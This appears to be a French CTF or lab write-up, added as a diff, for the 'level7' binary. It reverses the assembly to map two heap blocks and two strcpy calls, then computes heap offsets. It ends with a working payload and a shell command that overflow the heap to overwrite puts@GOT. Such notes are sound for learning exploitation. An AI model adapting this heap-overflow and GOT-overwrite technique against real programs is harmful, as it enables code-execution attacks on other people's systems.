@@ -1,0 +1,53 @@
+0x1c(%esp) = premier malloc
+(%eax) = 1;
+%edx = deuxieme malloc
+puis apres 0x4(%eax) = deuxieme malloc
+0x18(%esp) = troisieme malloc
+(%eax) = 2;
+%edx = quatrieme malloc puis 0x4(%eax) = quatrieme malloc
+
+on a donc deux bloc de malloc :
+BLOC 1 ------------------------
+0x1c(%esp) = p1[0] | 0x4(%eax) = p1[1]
+
+BLOC 2-------------------------
+0x18(%esp) = p3[0] | 0x4(%eax) = p3[1]
+
+Avant le premier strcpy on voit une preparation d'argument :
+mov 0x1c(%esp),%eax
+mov 0x4(%eax),%eax
+
+Donc le premier malloc, donc premier bloc, alors le 0x4(%eax) qui suit est logiauement
+le deuxieme malloc qui appartient aussi au premier bloc.
+
+Donc : strcpy(buffer[1], argv[1]);
+
+Apres le premier strcpy, on recupere argv[2] et on le stock dans edx.
+On prepare ensuite les arguments du deuxieme strcpy, soit le deuxieme bloc malloc
+   0x080485af <+142>:	mov    0x18(%esp),%eax  ---- > Troisieme malloc (deuxieme bloc p3[0])
+   0x080485b3 <+146>:	mov    0x4(%eax),%eax ---- > Quatrieme malloc (p3[1])
+   0x080485b6 <+149>:	mov    %edx,0x4(%esp) ---- > argv[2] dans esp+4 (2eme argument)
+   0x080485ba <+153>:	mov    %eax,(%esp) ---- > p3[1] dans esp (1er argument)
+
+Donc : strcpy(p3[1], argv[2]);
+
+
+NOTE :
+
+p1 = 0x0804a008
+p2 = 0x0804a018
+p3 = 0x0804a028
+p4 = 0x0804a038
+
+p2       = 0x0804a018
+puts@GOT = 0x08049928
+distance = 1776 octets -> trop long, premier strcpy peut pas atteindre
+
+
+p/d 0x0804a02c - 0x0804a018 -> from p2 to p4
+$4 = 20 -> distance raisonnable
+
+argv[1] = "A"*20 + "\x28\x99\x04\x08"
+argv[2] = "\xf4\x84\x04\x08"
+
+./level7 "$(python -c 'print "A"*20 + "\x28\x99\x04\x08"')" "$(python -c 'print "\xf4\x84\x04\x08"')"
